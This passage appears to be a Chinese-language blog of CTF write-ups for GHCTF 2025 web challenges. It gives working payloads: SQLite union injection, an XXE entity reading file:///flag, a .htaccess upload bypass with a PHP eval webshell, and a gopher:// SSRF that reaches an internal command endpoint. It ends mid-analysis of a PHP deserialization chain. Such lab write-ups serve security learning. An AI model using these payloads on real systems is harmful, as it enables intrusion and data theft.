loading="lazy"></p><p>很多人到这进一步之后就直接使用mysql语句直接注入（我也一样😶），在这之后就一直跟这个sql语句过不去了，一直怀疑是题目过滤了一大堆东西</p><p>然后突然间想到23年的国赛题目，也是SQL注入</p><p><a href="https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html">https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html</a></p><p><a href="https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html#">题目+答案+2023年全国职业院校技能大赛信息安全管理与评估真题 - JunBlog</a></p><p>想到可能是数据库的不同</p><p>转换思想，尝试用每个sql数据库的不同sql语句尝试</p><p>查看回显位</p><pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,2,3,4,5</code></pre><p><img src="1741586509126-34dfe6cf-c494-40cf-9752-226c7b0c05b1.png" loading="lazy"></p><p>果不其然，通过sqlite_version()函数确认了数据库</p><pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,sqlite_version(),3,4,5</code></pre><p><img src="1741586610138-4b83d176-ae74-44a3-9966-92059725410f.png" loading="lazy"></p><p>这里推荐一篇讲sqlite注入的文章</p><p><a href="https://xz.aliyun.com/news/8220?time__1311=YqUxg7DQi=30HRx+hDArUtGOY8Dt88T4D&u_atoken=eb5b96e94d51cbebed2d598991a308cc&u_asig=0a472f9017415793738783147e00df">https://xz.aliyun.com/news/8220?time__1311&#x3D;YqUxg7DQi%3D30HRx%2BhDArUtGOY8Dt88T4D&amp;u_atoken&#x3D;eb5b96e94d51cbebed2d598991a308cc&amp;u_asig&#x3D;0a472f9017415793738783147e00df</a></p><p>使用<strong>sql from sqlite_master</strong>查看表名</p><pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,sqlite_version(),3,4,sql from sqlite_master</code></pre><p><img src="1741587015088-79d885dd-90b2-429d-b323-72b3d7839c41.png" loading="lazy"></p><p>可以看到存在flag表</p><p>那就直接查看flag</p><pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,2,3,4,group_concat(flag) from flag</code></pre><p><img src="1741587325602-32b5b38d-cd11-4003-8760-ed88515981df.png" loading="lazy"></p><h1 id="GHCTF-2025-﹏"><a href="#GHCTF-2025-﹏" class="headerlink" title="[GHCTF 2025] (&gt;﹏&lt;)"></a>[GHCTF 2025] (&gt;﹏&lt;)</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://www.nssctf.cn/problem/6578">https://www.nssctf.cn/problem/6578</a></p><h2 id="题解-wp-1"><a href="#题解-wp-1" class="headerlink" title="题解(wp)"></a>题解(wp)</h2><p>打开题目发现返回了源码（缩进呢！！！🖕🖕🖕🖕）</p><p><img src="1741587514129-5919571f-b00f-4527-9055-2497d4e10be3.png" loading="lazy"></p><p>尝试恢复缩进</p><pre><code class="language-python">from flask import Flask, requestimport base64from lxml import etreeimport reapp = Flask(__name__)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/ghctf&#39;, methods=[&#39;POST&#39;])def parse():    xml = request.form.get(&#39;xml&#39;)    print(xml)    if xml is None:        return &quot;No System is Safe.&quot;    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)    root = etree.fromstring(xml, parser)    name = root.find(&#39;name&#39;).text    return name or Noneif __name__ == &quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;, port=8080)</code></pre><p>在代码中导入了Flask、request、base64、lxml.etree和re模块。然后创建了一个Flask应用实例</p><pre><code class="language-python">app = Flask(__name__)</code></pre><p>定义了两个路由：根路径’&#x2F;‘和’&#x2F;ghctf’的POST请求处理函数。</p><pre><code class="language-python">@app.route(&#39;/&#39;)</code></pre><pre><code class="language-python">@app.route(&#39;/ghctf&#39;, methods=[&#39;POST&#39;])</code></pre><p>接下来看到处理’&#x2F;ghctf’的POST的函数<strong>parse()</strong></p><pre><code class="language-python">@app.route(&#39;/ghctf&#39;, methods=[&#39;POST&#39;])def parse():    xml = request.form.get(&#39;xml&#39;)    print(xml)    if xml is None:        return &quot;No System is Safe.&quot;</code></pre><p>它从请求表单中获取名为’xml’的参数，然后打印出来。如果没有提供xml参数，就返回”No System is Safe.”</p><p>接着使用etree.XMLParser配置解析器，允许加载DTD并解析实体。然后尝试解析传入的xml字符串，并提取<name>标签的文本内容返回。</name></p><pre><code class="language-python">parser = etree.XMLParser(load_dtd=True, resolve_entities=True)    root = etree.fromstring(xml, parser)    name = root.find(&#39;name&#39;).text    return name or None</code></pre><p>因为解析器启用了resolve_entities&#x3D;True，所以这里我推断存在xxe（<font style="color:rgb(139, 139, 139);">XML外部实体注入（XXE）漏洞</font>）</p><p>构建xml引用file:&#x2F;&#x2F;&#x2F;flag</p><pre><code class="language-xml">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;root&gt;  &lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>将xml进行url编码</p><p>并使用POST发包</p><pre><code class="language-python">xml=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///flag%22%3E]%3E%3Croot%3E%3Cname%3E%26xxe;%3C/name%3E%3C/root%3E</code></pre><p><img src="1741593612324-6d211200-2105-4c0a-a452-0b5d78c34e7e.png" loading="lazy"></p><p>flag</p><p><font style="color:rgb(0, 0, 0);">NSSCTF{e6a0765a-7b69-4b91-b17b-103f97cf97f8}</font></p><h1 id="GHCTF-2025-UPUPUP"><a href="#GHCTF-2025-UPUPUP" class="headerlink" title="[GHCTF 2025]UPUPUP"></a>[GHCTF 2025]UPUPUP</h1><h2 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://www.nssctf.cn/problem/6590">https://www.nssctf.cn/problem/6590</a></p><h2 id="题解-wp-2"><a href="#题解-wp-2" class="headerlink" title="题解(wp)"></a>题解(wp)</h2><p>打开题目</p><p><img src="1741594739679-a184e752-6193-4937-8d0f-b06d0bb3ee6c.png" loading="lazy"></p><p>文件上传题目</p><p>尝试上传phpinfo()</p><p><img src="1741594938128-f1d8005c-aa70-4e20-a0ad-4e9b7d1491d1.png" loading="lazy"></p><p><img src="1741594986679-5a81e84d-4c14-480b-a567-240b7e44a1cb.png" loading="lazy"></p><p>看来是对文件内容有过滤</p><p>换一种</p><p>直接在图片末尾加上<?php phpinfo(); ?></p><p><img src="1741595246431-d21b9db9-b0cc-428e-b902-59ea588ae127.png" loading="lazy"></p><p>上传</p><p><img src="1741595269700-75fd21a0-1f53-40fb-94fa-e8ba8632ec99.png" loading="lazy"></p><p>上传成功，但是却是以jpg结尾的（php结尾的会被过滤），无法解析</p><p>想到apache服务器的上传<font style="color:rgb(38,38,38);">.htaccess文件进行解析绕过</font></p><p><img src="1741595417742-6d21483b-044d-437a-bbf0-6c6d8ca641a7.png" loading="lazy"></p><p><img src="1741595430137-b14a9e42-394d-4131-ab78-32de2023d71b.png" loading="lazy"></p><p>😕</p><p>想到了文件头绕过</p><p><font style="color:rgb(38,38,38);">但如果直接在 .htaccess 开头加⼊ GIF89A 的话访问整个 images ⽬录下的⽂件都会爆 </font></p><p><font style="color:rgb(38,38,38);">500, 会出现语法错误</font></p><p><font style="color:rgb(38,38,38);">.htaccess 通过 # 来注释, 后来了解到还有 \x00</font></p><pre><code class="language-python">#define width 1#define height 1&lt;FilesMatch &quot;jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p><img src="1741596107226-488edb76-afd1-46d8-8366-43bf5ae412a2.png" loading="lazy"></p><p>上传成功</p><p><img src="1741596131525-61d9314a-cb11-41d1-95dd-fa2a74701273.png" loading="lazy"></p><p>上传一句话木马</p><p>hey.hey</p><pre><code class="language-php">#define width 1#define height 1&lt;?php  eval($_POST[&quot;anro&quot;]);?&gt;</code></pre><p><img src="1741596603705-69f2f4b9-cf95-4184-8f5f-b5dd2d351fb6.png" loading="lazy"></p><p><img src="1741596646329-3e9e4b9f-f486-4ef3-a975-c0e9b903b696.png" loading="lazy"></p><h1 id="GHCTF-2025-Goph3rrr"><a href="#GHCTF-2025-Goph3rrr" class="headerlink" title="[GHCTF 2025]Goph3rrr"></a>[GHCTF 2025]Goph3rrr</h1><h2 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://www.nssctf.cn/problem/6582">https://www.nssctf.cn/problem/6582</a></p><h2 id="题解（wp）"><a href="#题解（wp）" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p><img src="1741603959131-15504d0f-710d-4cdb-9a4a-f7456950bda4.png" loading="lazy"></p><p>打开题目</p><p>看看前端有没有什么东西</p><p><img src="1741604022435-480e1814-42c5-4f78-b33a-653ef74fc1b3.png" loading="lazy"></p><p>什么都没找到</p><p>使用dirsearch 进行目录扫描</p><p><img src="1741605001752-56e85db7-14ec-4630-898d-58684a110edd.png" loading="lazy"></p><p><img src="1741605028946-a85e4977-3b8c-4ba8-9643-326538f0206f.png" loading="lazy"></p><p>打开源码</p><pre><code class="language-python">from flask import Flask, request, send_file, render_template_stringimport osfrom urllib.parse import urlparse, urlunparseimport subprocessimport socketimport hashlibimport base64import randomapp = Flask(__name__)BlackList = [    &quot;127.0.0.1&quot;]@app.route(&#39;/&#39;)def index():    return &#39;&#39;&#39;    &lt;html&gt;        &lt;head&gt;            &lt;style&gt;                body &#123;                    background-size: cover; /* 背景图片覆盖整个页面 */                    height: 100vh; /* 页面高度填满浏览器窗口 */                    display: flex;                    justify-content: center; /* 水平居中 */                    align-items: center; /* 垂直居中 */                    color: white; /* 字体颜色 */                    font-family: Arial, sans-serif; /* 字体 */                    text-align: center; /* 文字居中 */                &#125;                h1 &#123;                    font-size: 50px;                    transition: transform 0.2s ease-in-out; /* 设置浮动效果过渡时间 */                &#125;                h1:hover &#123;                    transform: translateY(-10px); /* 向上浮动 */                &#125;            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;h1&gt;Hello Ctfer!!! Welcome to the GHCTF challenge! (≧∇≦)&lt;/h1&gt;        &lt;/body&gt;    &lt;/html&gt;    &#39;&#39;&#39;@app.route(&#39;/Login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def login():    junk_code()    if request.method == &#39;POST&#39;:        username = request.form.get(&#39;username&#39;)        password = request.form.get(&#39;password&#39;)        if username in users and users[username][&#39;password&#39;] == hashlib.md5(password.encode()).hexdigest():            return b64e(f&quot;Welcome back, &#123;username&#125;!&quot;)        return b64e(&quot;Invalid credentials!&quot;)    return render_template_string(&quot;&quot;&quot;        &lt;!DOCTYPE html&gt;        &lt;html lang=&quot;en&quot;&gt;        &lt;head&gt;            &lt;meta charset=&quot;UTF-8&quot;&gt;            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;            &lt;title&gt;Login&lt;/title&gt;            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;            &lt;style&gt;                body &#123;                    background-color: #f8f9fa;                &#125;                .container &#123;                    max-width: 400px;                    margin-top: 100px;                &#125;                .card &#123;                    border: none;                    border-radius: 10px;                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);                &#125;                .card-header &#123;                    background-color: #007bff;                    color: white;                    text-align: center;                    border-radius: 10px 10px 0 0;                &#125;                .btn-primary &#123;                    background-color: #007bff;                    border: none;                &#125;                .btn-primary:hover &#123;                    background-color: #0056b3;                &#125;            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;div class=&quot;container&quot;&gt;                &lt;div class=&quot;card&quot;&gt;                    &lt;div class=&quot;card-header&quot;&gt;                        &lt;h3&gt;Login&lt;/h3&gt;                    &lt;/div&gt;                    &lt;div class=&quot;card-body&quot;&gt;                        &lt;form method=&quot;POST&quot;&gt;                            &lt;div class=&quot;mb-3&quot;&gt;                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;                            &lt;/div&gt;                            &lt;div class=&quot;mb-3&quot;&gt;                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;                            &lt;/div&gt;                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;Login&lt;/button&gt;                        &lt;/form&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;)@app.route(&#39;/Gopher&#39;)def visit():    url = request.args.get(&#39;url&#39;)    if url is None:        return &quot;No url provided :)&quot;    url = urlparse(url)    realIpAddress = socket.gethostbyname(url.hostname)    if url.scheme == &quot;file&quot; or realIpAddress in BlackList:        return &quot;No (≧∇≦)&quot;    result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)    return result.stdout@app.route(&#39;/RRegister&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def register():    junk_code()    if request.method == &#39;POST&#39;:        username = request.form.get(&#39;username&#39;)        password = request.form.get(&#39;password&#39;)        if username in users:            return b64e(&quot;Username already exists!&quot;)        users[username] = &#123;&#39;password&#39;: hashlib.md5(password.encode()).hexdigest()&#125;        return b64e(&quot;Registration successful!&quot;)    return render_template_string(&quot;&quot;&quot;        &lt;!DOCTYPE html&gt;        &lt;html lang=&quot;en&quot;&gt;        &lt;head&gt;            &lt;meta charset=&quot;UTF-8&quot;&gt;            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;            &lt;title&gt;Register&lt;/title&gt;            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;            &lt;style&gt;                body &#123;                    background-color: #f8f9fa;                &#125;                .container &#123;                    max-width: 400px;                    margin-top: 100px;                &#125;                .card &#123;                    border: none;                    border-radius: 10px;                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);                &#125;                .card-header &#123;                    background-color: #28a745;                    color: white;                    text-align: center;                    border-radius: 10px 10px 0 0;                &#125;                .btn-success &#123;                    background-color: #28a745;                    border: none;                &#125;                .btn-success:hover &#123;                    background-color: #218838;                &#125;            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;div class=&quot;container&quot;&gt;                &lt;div class=&quot;card&quot;&gt;                    &lt;div class=&quot;card-header&quot;&gt;                        &lt;h3&gt;Register&lt;/h3&gt;                    &lt;/div&gt;                    &lt;div class=&quot;card-body&quot;&gt;                        &lt;form method=&quot;POST&quot;&gt;                            &lt;div class=&quot;mb-3&quot;&gt;                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;                            &lt;/div&gt;                            &lt;div class=&quot;mb-3&quot;&gt;                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;                            &lt;/div&gt;                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-success w-100&quot;&gt;Register&lt;/button&gt;                        &lt;/form&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;)@app.route(&#39;/Manage&#39;, methods=[&#39;POST&#39;])def cmd():    if request.remote_addr != &quot;127.0.0.1&quot;:        return &quot;Forbidden!!!&quot;    if request.method == &quot;GET&quot;:        return &quot;Allowed!!!&quot;    if request.method == &quot;POST&quot;:        return os.popen(request.form.get(&quot;cmd&quot;)).read()@app.route(&#39;/Upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def upload_avatar():    junk_code()    if request.method == &#39;POST&#39;:        username = request.form.get(&#39;username&#39;)        if username not in users:            return b64e(&quot;User not found!&quot;)        file = request.files.get(&#39;avatar&#39;)        if file:            file.save(os.path.join(avatar_dir, f&quot;&#123;username&#125;.png&quot;))            return b64e(&quot;Avatar uploaded successfully!&quot;)        return b64e(&quot;No file uploaded!&quot;)    return render_template_string(&quot;&quot;&quot;        &lt;!DOCTYPE html&gt;        &lt;html lang=&quot;en&quot;&gt;        &lt;head&gt;            &lt;meta charset=&quot;UTF-8&quot;&gt;            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;            &lt;title&gt;Upload Avatar&lt;/title&gt;            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;            &lt;style&gt;                body &#123;                    background-color: #f8f9fa;                &#125;                .container &#123;                    max-width: 400px;                    margin-top: 100px;                &#125;                .card &#123;                    border: none;                    border-radius: 10px;                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);                &#125;                .card-header &#123;                    background-color: #dc3545;                    color: white;                    text-align: center;                    border-radius: 10px 10px 0 0;                &#125;                .btn-danger &#123;                    background-color: #dc3545;                    border: none;                &#125;                .btn-danger:hover &#123;                    background-color: #c82333;                &#125;            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;div class=&quot;container&quot;&gt;                &lt;div class=&quot;card&quot;&gt;                    &lt;div class=&quot;card-header&quot;&gt;                        &lt;h3&gt;Upload Avatar&lt;/h3&gt;                    &lt;/div&gt;                    &lt;div class=&quot;card-body&quot;&gt;                        &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;                            &lt;div class=&quot;mb-3&quot;&gt;                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;                            &lt;/div&gt;                            &lt;div class=&quot;mb-3&quot;&gt;                                &lt;label for=&quot;avatar&quot; class=&quot;form-label&quot;&gt;Avatar&lt;/label&gt;                                &lt;input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatar&quot; name=&quot;avatar&quot; required&gt;                            &lt;/div&gt;                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger w-100&quot;&gt;Upload&lt;/button&gt;                        &lt;/form&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;)@app.route(&#39;/app.py&#39;)def download_source():    return send_file(__file__, as_attachment=True)if __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=8000)</code></pre><p>讲真的拿到源码的时候，我看到了一长串的密文被吓到了，然后往前翻的时候才看到这是背景图片的base64……..</p><p> <strong>分析源码</strong></p><p>首先分析各个路由都是干嘛的</p><p><strong>&#x2F;Login和&#x2F;RRegister路由</strong></p><p>登录和注册</p><p>处理用户登录和注册。用户密码使用MD5哈希存储</p><p><strong>&#x2F;Gopher 路由和&#x2F;Manage路由</strong></p><p>接收一个url参数，然后使用curl访问该URL</p><p>很容易就想到了SSRF，需要绕过过滤</p><p><font style="color:rgb(139, 139, 139);">- 检查URL的scheme是否是file，如果是则拒绝。</font></p><p><font style="color:rgb(139, 139, 139);">- 解析URL的主机名，获取其真实IP（realIpAddress），并检查是否在黑名单BlackList中（当前只有127.0.0.1）。</font></p><p><font style="color:rgb(139, 139, 139);">- 如果通过检查，则用curl访问该URL，并返回结果。</font></p><pre><code class="language-python">@app.route(&#39;/Gopher&#39;)def visit():    url = request.args.get(&#39;url&#39;)    if url is None:        return &quot;No url provided :)&quot;    url = urlparse(url)    realIpAddress = socket.gethostbyname(url.hostname)    if url.scheme == &quot;file&quot; or realIpAddress in BlackList:        return &quot;No (≧∇≦)&quot;    result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)    return result.stdout</code></pre><p><strong>&#x2F;Upload路由</strong></p><p>允许上传头像，保存为PNG文件，由于源码采用的是Flask，可能不会执行</p><p>在处理上传文件时,如果用户名包含模板注入的payload，并且文件名被渲染到模板中，可能导致SSTI。但当前代码中，上传成功后的返回信息是经过base64编码的，没有使用模板渲染,所以不大可能存在ssti</p><h3 id="分析漏洞点"><a href="#分析漏洞点" class="headerlink" title="分析漏洞点"></a>分析漏洞点</h3><p>从每个路由的作用和功能来看，目前就只有ssrf这一个突破点😤</p><p>现在唯一可能的方法是使用Gopher协议发送POST请求，并且绕过hostname的检查。</p><p>也就是构造一个Gopher URL，并且不能存在于黑名单</p><p>也就是不能等于127.0.0.1</p><pre><code class="language-python">app = Flask(__name__)BlackList = [    &quot;127.0.0.1&quot;]</code></pre><p>这里我提供两种解决方法</p><h4 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h4><p>利用DNS重绑定攻击，让请求的URL不包含127.0.0.1</p><p>这里推荐一篇关于DNS重绑定攻击的文章</p><p><a href="https://blog.csdn.net/qq_36348899/article/details/119297854">https://blog.csdn.net/qq_36348899&#x2F;article&#x2F;details&#x2F;119297854</a></p><p>重绑定的网址</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><h4 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h4><p>我们的URL地址不能包含127.0.0.1，但是并没有说地址不能包含其它的127的地址呀</p><p>也就是所有以127开头的本地回环地址都可以作为发送的URL地址</p><p>这里我就采用第二种方法</p><p>构造一个Gopher URL，发送的数据以POST请求到127.0.0.1:8000&#x2F;Manage，并携带cmd参数</p><p>有点绕，重新梳理一下</p><ul><li>&#x2F;Manage路由的POST请求可以执行命令，但必须remote_addr是127.0.0.1。</li><li>&#x2F;Gopher路由存在SSRF，但无法发送POST请求，并且当连接到127.0.0.1时会被过滤。</li></ul><p>那么第一步，首先构造Gopher URL</p><pre><code class="language-python">http://node6.anna.nssctf.cn:24175/Manage</code></pre><p>并且POST发包，发送cmd参数</p><pre><code class="language-python">cmd=env</code></pre><p>完整的请求为</p><pre><code class="language-python">POST /Manage HTTP/1.1host:127.0.0.1Content-Type:application/x-www-form-urlencodedContent-Length:7cmd=env</code></pre><p>第二步，<font style="color:rgb(64, 64, 64);">将构造的Gopher URL作为参数发送到</font><code>&lt;font style=&quot;color:rgb(64, 64, 64);&quot;&gt;/Gopher&lt;/font&gt;</code><font style="color:rgb(64, 64, 64);">路由</font></p><p><font style="color:rgb(64, 64, 64);">将上面的完整请求转化为参数，经过两次url转码</font></p><p><font style="color:rgb(64, 64, 64);">变为</font></p><pre><code class="language-python">POST%2520%252FManage%2520HTTP%252F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv</code></pre><p>把参数和127.0.0.2:8000进行拼接（黑名单过滤了127.0.0.1所以用127.0.0.2）</p><pre><code class="language-python">/Gopher?url=gopher://127.0.0.2:8000/_POST%2520%252FManage%2520HTTP%252F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv</code></pre><p>发包<br><img src="1741610144938-0392732d-640c-46c4-82ae-faa92ef1606e.png" loading="lazy"></p><p>成功获取flag</p><p><font style="color:rgb(0, 0, 0);">NSSCTF{5631b4f8-a764-40a0-acf7-cb05bcd40a00}</font></p><p>为什么用env命令</p><p>其它参数也试过但没有找到flag,谁会想到它藏在了环境当中啊💔</p><h1 id="GHCTF-2025-Popppppp"><a href="#GHCTF-2025-Popppppp" class="headerlink" title="[GHCTF 2025]Popppppp"></a>[GHCTF 2025]Popppppp</h1><h2 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://www.nssctf.cn/problem/6591">https://www.nssctf.cn/problem/6591</a></p><h2 id="题解（wp）-1"><a href="#题解（wp）-1" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p>打开题目</p><p><img src="1741761056352-81310bcb-a890-4f4a-940c-a141425541a6.png" loading="lazy"></p><pre><code class="language-php">&lt;?phperror_reporting(0);class CherryBlossom &#123;    public $fruit1;    public $fruit2;    public function __construct($a) &#123;        $this-&gt;fruit1 = $a;    &#125;    function __destruct() &#123;        echo $this-&gt;fruit1;    &#125;    public function __toString() &#123;        $newFunc = $this-&gt;fruit2;        return $newFunc();    &#125;&#125;class Forbidden &#123;    private $fruit3;    public function __construct($string) &#123;        $this-&gt;fruit3 = $string;    &#125;    public function __get($name) &#123;        $var = $this-&gt;$name;        $var[$name]();    &#125;&#125;class Warlord &#123;    public $fruit4;    public $fruit5;    public $arg1;    public function __call($arg1, $arg2) &#123;        $function = $this-&gt;fruit4;        return $function();    &#125;    public function __get($arg1) &#123;        $this-&gt;fruit5-&gt;ll2(&#39;b2&#39;);    &#125;&#125;class Samurai &#123;    public $fruit6;    public $fruit7;    public function __toString() &#123;        $long = @$this-&gt;fruit6-&gt;add();        return $long;    &#125;    public function __set($arg1, $arg2) &#123;        if ($this-&gt;fruit7-&gt;tt2) &#123;            echo &quot;xxx are the best!!!&quot;;        &#125;    &#125;&#125;class Mystery &#123;    public function __get($arg1) &#123;        array_walk($this, function ($day1, $day2) &#123;            $day3 = new $day2($day1);            foreach ($day3 as $day4) &#123;                echo ($day4 . &#39;&lt;br&gt;&#39;);            &#125;        &#125;);    &#125;&#125;class Princess &#123;    protected $fruit9;    protected function addMe() &#123;        return &quot;The time spent with xxx is my happiest time&quot; . $this-&gt;fruit9;    &#125;    public function __call($func, $args) &#123;        call_user_func([$this, $func . &quot;Me&quot;], $args);    &#125;&#125;class Philosopher &#123;    public $fruit10;    public $fruit11=&quot;sr22kaDugamdwTPhG5zU&quot;;    public function __invoke() &#123;        if (md5(md5($this-&gt;fruit11)) == 666) &#123;            return $this-&gt;fruit10-&gt;hey;        &#125;    &#125;&#125;class UselessTwo &#123;    public $hiddenVar = &quot;123123&quot;;    public function __construct($value) &#123;        $this-&gt;hiddenVar = $value;    &#125;    public function __toString() &#123;        return $this-&gt;hiddenVar;    &#125;&#125;class Warrior &#123;    public $fruit12;    private $fruit13;    public function __set($name, $value) &#123;        $this-&gt;$name = $value;        if ($this-&gt;fruit13 == &quot;xxx&quot;) &#123;            strtolower($this-&gt;fruit12);        &#125;    &#125;&#125;class UselessThree &#123;    public $dummyVar;    public function __call($name, $args) &#123;        return $name;    &#125;&#125;class UselessFour &#123;    public $lalala;    public function __destruct() &#123;        echo &quot;Hehe&quot;;    &#125;&#125;if (isset($_GET[&#39;GHCTF&#39;])) &#123;    unserialize($_GET[&#39;GHCTF&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;</code></pre><p>直接看最后有接收参数，并且进行反序列化</p><p>ok，太长😱，不做了</p><p><img src="1741769819330-d1c32618-88ed-4166-8867-5241558bb9d7.jpeg" loading="lazy"></p><p>该来的还是会来的</p><p>首先可以确认的是<font style="color:rgb(38,38,38);">一道pop链构造，并且要找到⼀整条链⼦的构造</font>，</p><p>那么就要找到链尾（就是执行恶意代码的地方）</p><p>分析这些类都是干啥的</p><ol><li><strong>CherryBlossom</strong>类：</li></ol><ul><li><code>__destruct()</code>方法会输出<code>fruit1</code>，如果<code>fruit1</code>是一个对象，可能会触发其<code>__toString()</code>方法。</li><li><code>__toString()</code>方法会调用<code>fruit2</code>作为函数，所以如果<code>fruit2</code>是一个可调用的对象（比如有<code>__invoke()</code>方法），就会触发。</li></ul><pre><code class="language-php">class CherryBlossom &#123;    public $fruit1;    public $fruit2;    public function __construct($a) &#123;        $this-&gt;fruit1 = $a;    &#125;    function __destruct() &#123;        echo $this-&gt;fruit1;    &#125;    public function __toString() &#123;        $newFunc = $this-&gt;fruit2;        return $newFunc();    &#125;&#125;</code></pre><ol start="2"><li><strong>Forbidden</strong>类：</li></ol><ul><li><code>__get()</code>方法会尝试调用<code>$var[$name]()</code>。这里如果<code>$var</code>是一个数组，并且某个键对应的方法存在，可能会被调用。</li></ul><ol start="3"><li><strong>Warlord</strong>类：</li></ol><ul><li><code>__call()</code>方法会调用<code>fruit4</code>作为函数。</li><li><code>__get()</code>方法会调用<code>fruit5-&gt;ll2(&#39;b2&#39;)</code>，如果<code>fruit5</code>有<code>ll2</code>方法的话。</li></ul><ol start="4"><li><strong>Samurai</strong>类：</li></ol><ul><li><code>__toString()</code>方法调用<code>fruit6-&gt;add()</code>，如果<code>fruit6</code>有<code>add()</code>方法的话。</li><li><code>__set()</code>方法检查<code>fruit7-&gt;tt2</code>是否为真，可能触发<code>__get()</code>。</li></ul><ol start="5"><li><strong>Mystery</strong>类：</li></ol><ul><li><code>__get()</code>方法使用<code>array_walk</code>遍历自身属性，可能会实例化某些类并输出内容。</li></ul><ol start="6"><li><strong>Princess</strong>类：</li></ol><ul><li><code>__call()</code>方法会尝试调用<code>addMe()</code>，但似乎没有明显的危险操作。</li></ul><ol start="7"><li><strong>Philosopher</strong>类：</li></ol><ul><li><code>__invoke()</code>方法在对象被当作函数调用时触发。这里检查<code>md5(md5($this-&gt;fruit11)) == 